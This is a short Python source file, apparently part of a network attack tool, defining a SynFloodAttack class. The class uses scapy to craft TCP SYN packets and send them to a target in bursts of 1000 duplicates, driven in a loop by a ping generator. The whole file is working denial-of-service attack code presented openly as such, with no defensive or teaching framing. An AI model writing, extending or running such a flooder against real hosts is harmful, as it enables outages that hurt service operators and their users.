from attacks.tcp.services import TcpService
from scapy.all import send
from shared.attacks import AttackRequest


class SynFloodAttack:
    def __init__(self, attack_request: AttackRequest) -> None:
        self._service: TcpService = TcpService(attack_request)
        self._attack_request: AttackRequest = attack_request
        self._payload_size: int = self._attack_request.size.value
        self.DUPLICATES = 1000

    def run(self) -> None:
        """Create and send packet to the target"""
        for _ in self._service.ping(self._attack_request.target):
            packet = self._service.craft_syn_packet()
            send(packet, verbose=False, count=self.DUPLICATES)

    def run_debug(self) -> None:
        """Debug run"""
        self.run()
